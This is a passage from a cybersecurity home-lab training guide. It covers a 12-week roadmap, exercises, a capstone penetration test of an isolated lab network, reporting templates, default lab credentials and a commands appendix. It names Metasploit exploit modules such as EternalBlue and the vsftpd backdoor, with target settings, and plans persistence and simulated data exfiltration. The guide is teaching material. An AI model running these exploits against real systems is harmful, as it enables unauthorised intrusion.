3. **Eradication** - Remove malware/threat
4. **Recovery** - Restore normal operations
5. **Lessons Learned** - Document and improve

---

## 16. Weekly Learning Roadmap

### 12-Week Comprehensive Plan

#### Week 1: Lab Setup & Networking Fundamentals
**Objectives:**
- [ ] Install VirtualBox/VMware
- [ ] Configure host-only network
- [ ] Deploy Kali Linux VM
- [ ] Test network connectivity

**Tasks:**
1. Install virtualization software
2. Create host-only network adapter
3. Install Kali Linux
4. Configure network settings
5. Verify connectivity between VMs

**Resources:**
- VirtualBox documentation
- Kali Linux documentation

#### Week 2: Linux Fundamentals & Command Line
**Objectives:**
- [ ] Master Linux CLI
- [ ] Understand file system
- [ ] Learn package management
- [ ] Practice with essential tools

**Tasks:**
1. Complete Linux command line tutorials
2. Practice file manipulation commands
3. Install software packages
4. Configure SSH access

**Resources:**
- Linux Journey (linuxjourney.com)
- Command Line Challenge

#### Week 3: Network Scanning with Nmap
**Objectives:**
- [ ] Understand network protocols
- [ ] Perform network reconnaissance
- [ ] Use Nmap effectively
- [ ] Analyze scan results

**Tasks:**
1. Scan entire lab network
2. Identify active hosts
3. Enumerate open ports
4. Detect operating systems
5. Use NSE scripts

**Resources:**
- Nmap Documentation
- ZeroScan (Nmap wrapper)

#### Week 4: Packet Analysis with Wireshark
**Objectives:**
- [ ] Capture network traffic
- [ ] Apply capture filters
- [ ] Analyze protocols
- [ ] Identify anomalies

**Tasks:**
1. Capture traffic during normal activity
2. Analyze TCP handshake
3. Filter HTTP traffic
4. Identify malicious patterns

#### Week 5: Introduction to Metasploit
**Objectives:**
- [ ] Navigate Metasploit framework
- [ ] Use auxiliary modules
- [ ] Execute basic exploits
- [ ] Understand Meterpreter

**Tasks:**
1. Scan targets with Metasploit
2. Exploit vulnerable services
3. Use Meterpreter
4. Practice post-exploitation

#### Week 6: Vulnerable Targets & Exploitation
**Objectives:**
- [ ] Exploit Metasploitable
- [ ] Attack Windows targets
- [ ] Use various exploit types
- [ ] Document findings

**Tasks:**
1. Complete all Metasploitable challenges
2. Exploit Windows vulnerabilities
3. Practice with different payloads

#### Week 7: Web Application Security
**Objectives:**
- [ ] Understand OWASP Top 10
- [ ] Use Burp Suite
- [ ] Test with OWASP ZAP
- [ ] Exploit web vulnerabilities

**Tasks:**
1. Install vulnerable web apps
2. Configure Burp Suite proxy
3. Test for SQL injection
4. Test for XSS
5. Complete DVWA challenges

#### Week 8: Password Attacks & Social Engineering
**Objectives:**
- [ ] Perform password attacks
- [ ] Use cracking tools
- [ ] Understand phishing
- [ ] Practice safely

**Tasks:**
1. Use Hydra for brute force
2. Use Hashcat for cracking
3. Create phishing scenario (lab only)
4. Practice with Creddump

#### Week 9: Active Directory Attacks
**Objectives:**
- [ ] Set up AD lab
- [ ] Enumerate AD
- [ ] Perform AD attacks
- [ ] Practice defense

**Tasks:**
1. Deploy Windows Server DC
2. Join clients to domain
3. Use BloodHound
4. Practice Kerberoasting

#### Week 10: SOC & Monitoring
**Objectives:**
- [ ] Configure ELK/Splunk
- [ ] Set up SIEM
- [ ] Create alerts
- [ ] Analyze logs

**Tasks:**
1. Install and configure ELK
2. Forward logs from targets
3. Create dashboards
4. Configure alerts
5. Analyze attacks in SIEM

#### Week 11: Malware Analysis Introduction
**Objectives:**
- [ ] Set up analysis environment
- [ ] Perform static analysis
- [ ] Conduct dynamic analysis
- [ ] Document findings

**Tasks:**
1. Create isolated analysis VM
2. Perform static analysis
3. Run malware in sandbox
4. Document IOCs

#### Week 12: Capstone Project
**Objectives:**
- [ ] Complete comprehensive assessment
- [ ] Document findings professionally
- [ ] Present results

**Tasks:**
1. Conduct full penetration test
2. Document all findings
3. Create professional report
4. Present to stakeholders

---

## 17. Practical Exercises

### Exercise List (20 Exercises)

1. **Network Discovery** - Map entire lab network with Nmap
2. **Service Enumeration** - Identify all services on Metasploitable
3. **Vulnerability Assessment** - Scan targets with OpenVAS
4. **Exploitation** - Exploit VSFTPD vulnerability on Metasploitable
5. **Password Cracking** - Crack password hashes with Hashcat
6. **Web Application Testing** - Complete DVWA medium challenges
7. **Burp Suite Mastery** - Use all Burp Suite tools
8. **Packet Analysis** - Analyze attack traffic with Wireshark
9. **Log Analysis** - Investigate brute force attack in logs
10. **SIEM Dashboard** - Build security monitoring dashboard
11. **Incident Response** - Respond to simulated attack
12. **Active Directory** - Enumerate AD with BloodHound
13. **Privilege Escalation** - Escalate to root/admin
14. **Lateral Movement** - Pivot through network
15. **Malware Analysis** - Analyze suspicious file
16. **Red Team Engagement** - Complete multi-phase attack
17. **Blue Team Detection** - Detect and alert on attacks
18. **Network Forensics** - Investigate network compromise
19. **Web App Security** - Test OWASP Juice Shop
20. **Capstone Assessment** - Full penetration test

---

## 18. Mini Projects (10 Projects)

### Project List

1. **Automated Scanning Script** - Create bash script for automated scanning
   - Automate Nmap scans with cron jobs
   - Email results or save to database
   - Implement basic vulnerability detection

2. **Custom Nmap Scanner** - Build Python Nmap wrapper
   
```
python
   #!/usr/bin/env python3
   import nmap
   import sys
   
   def scan_network(network):
       nm = nmap.PortScanner()
       nm.scan(hosts=network, arguments='-sV -O')
       
       for host in nm.all_hosts():
           print(f"Host: {host}")
           for proto in nm[host].all_protocols():
               ports = nm[host][proto].keys()
               for port in ports:
                   print(f"Port: {port}, State: {nm[host][proto][port]['state']}")
   
   if __name__ == "__main__":
       scan_network(sys.argv[1] if len(sys.argv) > 1 else "192.168.100.0/24")
   
```

3. **Attack Visualization Dashboard** - Build web-based attack map
   - Use D3.js or similar for visualization
   - Real-time attack detection display
   - Geographic mapping of attackers

4. **Password Cracking Framework** - Create GUI tool for Hashcat
   - Support multiple hash types
   - Queue management for attacks
   - Progress tracking

5. **Log Analysis Engine** - Build automated log analyzer
   - Parse multiple log formats
   - Detect anomalies
   - Generate alerts

6. **Network Intrusion Detection** - Custom IDS with Snort
   - Write custom rules
   - Implement alerting
   - Dashboard for alerts

7. **Vulnerability Scanner** - Python-based vulnerability scanner
   - Integrate OpenVAS API
   - Schedule scans
   - Generate reports

8. **Malware Sandbox** - Automated malware analysis
   - Cuckoo Sandbox integration
   - Behavior analysis
   - IOC extraction

9. **SIEM Dashboard** - Custom ELK dashboard
   - Security visualizations
   - Alert configuration
   - Incident tracking

10. **Complete Pentest Report Generator** - Automated reporting
    - Integrate findings from tools
    - Professional template
    - Executive summary

---

## 19. Capstone Project

### Comprehensive Security Assessment

**Project Overview:**
Conduct a complete security assessment of your lab environment, documenting all findings professionally.

### Scope

**In-Scope Systems:**
- All VMs in lab network (192.168.100.0/24)
- Web applications
- Windows domain (lab.local)
- Network infrastructure

### Project Deliverables

#### Phase 1: Reconnaissance (Day 1-2)

**Deliverables:**
- [ ] Network diagram
- [ ] Asset inventory
- [ ] Identified attack surfaces

**Commands:**
```
bash
# Network mapping
nmap -sn 192.168.100.0/24 -oA network_discovery
nmap -sS -sV -O 192.168.100.0/24 -oA full_scan

# Service enumeration
nmap -sV --script=banner 192.168.100.0/24
nmap --script=vuln 192.168.100.0/24
```

#### Phase 2: Vulnerability Assessment (Day 3-4)

**Deliverables:**
- [ ] Vulnerability report
- [ ] Risk ratings
- [ ] Exploitability assessment

**Tools to Use:**
- OpenVAS
- Nessus
- Nmap NSE
- Nikto

#### Phase 3: Exploitation (Day 5-6)

**Deliverables:**
- [ ] Proof of concept for each vulnerability
- [ ] Access gained
- [ ] Privilege escalation paths

**Exploits to Attempt:**
```
bash
# Metasploitable
use exploit/unix/ftp/vsftpd_234_backdoor
use exploit/multi/http/tomcat_mgr_upload

# Windows
use exploit/windows/smb/ms17_010_eternalblue
use exploit/multi/handler
```

#### Phase 4: Post-Exploitation (Day 7)

**Deliverables:**
- [ ] Persistence mechanisms
- [ ] Data exfiltration simulation
- [ ] Lateral movement demonstration

#### Phase 5: Documentation (Day 8)

**Report Structure:**

```
EXECUTIVE SUMMARY
=================
- Scope
- Methodology
- Key Findings
- Risk Summary

DETAILED FINDINGS
=================
1. Vulnerability Name
   - Severity: Critical/High/Medium/Low
   - Description
   - Impact
   - Proof of Concept
   - Remediation

APPENDIX
========
- Raw scan outputs
- Screenshots
- Command history
```

### Presentation

**Requirements:**
- 20-minute presentation
- Live demonstration
- Q&A session

---

## 20. Recommended Free Resources

### Learning Platforms

| Resource | URL | Focus |
|----------|-----|-------|
| TryHackMe | tryhackme.com | Hands-on labs |
| HackTheBox | hackthebox.com | Penetration testing |
| PentesterLab | pentesterlab.com | Web security |
| OWASP WebGoat | owasp.org | Web vulnerabilities |
| Metasploitable | rapid7.com | Exploitation practice |

### Documentation

| Resource | URL | Description |
|----------|-----|-------------|
| Nmap Docs | nmap.org/book/man.html | Nmap reference |
| Metasploit Docs | docs.metasploit.com | Metasploit guide |
| OWASP Top 10 | owasp.org/www-project-top-ten | Web risks |
| NIST CSF | csrc.nist.gov | Security framework |
| MITRE ATT&CK | attack.mitre.org | Attack techniques |

### Tools Documentation

| Tool | URL |
|------|-----|
| Wireshark | wireshark.org/docs |
| Burp Suite | portswigger.net/burp/documentation |
| Snort | snort.org/documents |
| Suricata | suricata.io/documentation |
| Splunk | docs.splunk.com |

### Cheat Sheets

| Resource | URL |
|----------|-----|
| PayloadsAllTheThings | github.com/swisskyrepo/PayloadsAllTheThings |
| Reverse Shell Cheatsheet | github.com/swisskyrepo/PayloadsAllTheThings/blob/master/ReverseShell |
| SQL Injection Cheatsheet | github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection |
| XSS Cheatsheet | github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS |

### Practice Platforms

| Platform | Focus | Cost |
|----------|-------|------|
| OverTheWire | Wargames | Free |
| Root Me | Various | Free |
| Hacker101 | Web | Free |
| PicoCTF | CTF | Free |
| VulnHub | VMs | Free |

### Books (Free)

| Title | URL |
|-------|-----|
| The Web Application Hacker's Handbook | raz0r.name (older edition) |
| Metasploit: The Penetration Tester's Guide | No Starch Press (purchase) |
| The Hacker Playbook 2/3 | No Starch Press (purchase) |

### YouTube Channels

| Channel | Focus |
|---------|-------|
| IppSec | HackTheBox walkthroughs |
| LiveOverflow | Security research |
| SecurityWeekly | Security news |
| Null Byte | Ethical hacking tutorials |
| HackerSploit | Linux and security |

---

## 21. How to Document Findings Professionally

### Purpose of Documentation

Professional documentation serves multiple purposes:
- Communicate findings to stakeholders
- Provide evidence of testing
- Enable remediation
- Create audit trail
- Support legal proceedings

### Report Structure

#### 1. Executive Summary

```
EXECUTIVE SUMMARY
==================

Project Name: Lab Security Assessment
Date: [Date]
Client: [Organization]
Assessment Team: [Names]
Scope: [Systems tested]

Overall Risk Rating: [Critical/High/Medium/Low]

Executive Summary:
[Brief 2-3 paragraph overview of findings and recommendations]

Key Findings:
- Finding 1: [Brief description]
- Finding 2: [Brief description]
- Finding 3: [Brief description]

Recommendations:
[Priority list of actions]
```

#### 2. Scope and Methodology

```
SCOPE
=====
In-Scope Systems:
- 192.168.100.10 (Kali Linux)
- 192.168.100.20 (Windows 10)
- 192.168.100.30 (Metasploitable)
- 192.168.100.40 (Ubuntu Server)

Out of Scope:
- Production systems
- Social engineering
- Physical security

METHODOLOGY
===========
1. Information Gathering
   - Passive reconnaissance
   - Active scanning

2. Vulnerability Assessment
   - Automated scanning
   - Manual verification

3. Exploitation
   - Proof of concept development
   - Validation of findings

4. Post-Exploitation
   - Privilege escalation
   - Persistence testing
```

#### 3. Findings Detail

Each finding should include:

```
FINDING #X: [Title]
====================

Severity: [Critical/High/Medium/Low/Informational]
CVSS Score: [X.X]
CVE (if applicable): [CVE-XXXX-XXXX]

Description:
[Detailed explanation of the vulnerability]

Impact:
[Business and technical impact]

Proof of Concept:
[Steps to reproduce with commands]

Remediation:
[Specific steps to fix]

References:
- Link 1
- Link 2
```

#### 4. Evidence

Include:
- Screenshots
- Command outputs
- Network captures
- Log excerpts

#### 5. Appendices

- Tool versions used
- Command history
- Raw scan outputs
- Glossary of terms

### Writing Guidelines

**DO:**
- Use clear, concise language
- Be specific with findings
- Provide actionable recommendations
- Include evidence
- Use proper formatting

**DON'T:**
- Use jargon without explanation
- Make assumptions
- Include unnecessary technical detail
- Blame individuals
- Overstate or understate risks

### Finding Severity Ratings

| Rating | Description | Example |
|--------|-------------|---------|
| **Critical** | Immediate threat, no user interaction | Remote code execution |
| **High** | Significant impact, may require user interaction | SQL injection with admin access |
| **Medium** | Moderate impact, requires specific conditions | XSS requiring user action |
| **Low** | Minimal impact | Information disclosure |
| **Informational** | Not a vulnerability | Best practice recommendation |

### Screenshot Guidelines

**Best Practices:**
1. Capture entire screen
2. Include timestamp/date
3. Highlight key information
4. Use arrow annotations if needed
5. Include tool name/version in caption

### Professional Tips

1. **Use templates** - Maintain consistent format
2. **Proofread** - Check for errors
3. **Peer review** - Have colleague review
4. **Version control** - Track document changes
5. **Backup** - Store securely

---

## Appendix A: Lab Network IP Addresses

| VM | IP Address | Purpose |
|----|------------|---------|
| Kali Linux | 192.168.100.10 | Attacker/Testing |
| Windows 10 | 192.168.100.20 | Target |
| Metasploitable | 192.168.100.30 | Vulnerable Target |
| Ubuntu Server | 192.168.100.40 | Target + DVWA |
| Splunk/ELK | 192.168.100.50 | Monitoring |
| Windows Server (AD) | 192.168.100.60 | Domain Controller |
| Windows 10 Client | 192.168.100.61 | Domain Member |

---

## Appendix B: Default Credentials

| Service | Username | Password |
|---------|----------|----------|
| Metasploitable SSH | msfadmin | msfadmin |
| DVWA | admin | password |
| Ubuntu Server | labuser | LabPass123! |
| Windows Local | labuser | LabPass123! |
| Windows Administrator | Administrator | ComplexPassword123! |
| Metasploitable MySQL | root | root |
| Splunk Admin | admin | (your password) |

---

## Appendix C: Common Commands Reference

### Network Scanning
```
bash
# Basic Nmap
nmap -sC -sV -p- 192.168.100.30

# UDP scan
sudo nmap -sU 192.168.100.30

# Vulnerability scan
nmap --script vuln 192.168.100.30

# Output formats
nmap -oA scan_results 192.168.100.30
```

### Metasploit
```
bash
# Start
msfconsole

# Search
search type:exploit platform:windows

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.168.100.20
set LHOST 192.168.100.10

# Run
exploit
```

### Log Analysis
```bash
# Linux auth logs
tail -f /var/log/auth.log
grep "Failed password" /var/log/auth.log

# Apache logs
tail -f /var/log/apache2/access.log

# System logs
journalctl -u ssh
```

### Network Commands
```
bash
# Check connections
netstat -antp

# View routing table
ip route

# Check DNS
nslookup target.com
dig target.com

# Packet capture
tcpdump -i eth0 port 80
```

---

## Appendix D: Safety Checklist

Before Starting Any Testing:

- [ ] Verify isolation from production networks
- [ ] Take VM snapshots
- [ ] Document current state
- [ ] Notify stakeholders (if applicable)
- [ ] Review scope and rules of engagement
- [ ] Have rollback plan
- [ ] Stop unnecessary services
- [ ] Verify backup status

During Testing:

- [ ] Document all commands executed
- [ ] Take screenshots of findings
- [ ] Save evidence securely
- [ ] Don't destroy evidence
- [ ] Stay within scope

After Testing:

- [ ] Restore systems to clean state
- [ ] Remove any installed backdoors
- [ ] Delete test accounts
- [ ] Document remediation steps
- [ ] Archive evidence

---

## Appendix E: Troubleshooting Common Issues

| Issue | Cause | Solution |
|-------|-------|----------|
| VM won't start | VT-x not enabled | Enable in BIOS |
| No network in VM | Guest additions missing | Install Guest Additions |
| Slow VM performance | Insufficient RAM | Increase RAM allocation |
| Cannot ping between VMs | Firewall enabled | Disable firewall |
| Metasploit database error | Database not initialized | Run msfdb init |
| Burp Suite certificate error | SSL interception | Import Burp CA cert |
| Wireshark no interfaces | Permission denied | Run with sudo |
| ELK won't start | Memory insufficient | Increase JVM heap |

---

## Final Notes

This lab environment provides a comprehensive platform for developing cybersecurity skills. Remember:

1. **Practice regularly** - Consistency is key
2. **Document everything** - Build good habits
3. **Stay legal** - Only test systems you own or have permission to test
4. **Keep learning** - Security is constantly evolving
5. **Join communities** - Learn from others
6. **Share knowledge** - Teaching reinforces learning

---

**Document Version:** 1.0  
**Last Updated:** 2024  
**Author:** Cybersecurity Lab Guide

---

